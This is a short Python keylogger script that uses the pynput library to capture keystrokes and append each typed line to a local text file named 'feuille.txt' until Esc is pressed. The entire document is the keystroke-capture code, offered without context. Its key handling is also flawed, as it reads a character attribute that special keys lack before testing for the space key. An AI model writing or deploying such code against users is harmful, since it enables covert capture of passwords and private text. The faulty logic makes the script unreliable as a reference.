from pynput.keyboard import  Listener, Key

lines = " "
def write_file(lines):
    with open("feuille.txt", "a") as file:
        file.write(lines + "\n")
                   

def on_press(key):
    global lines
    if key == Key.enter:
        print(lines)
        write_file(lines)
        lines = " "

    elif  key.char is not None and key.char.isalnum():
        lines += key.char
    elif key == Key.space:
        lines += " "
        

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
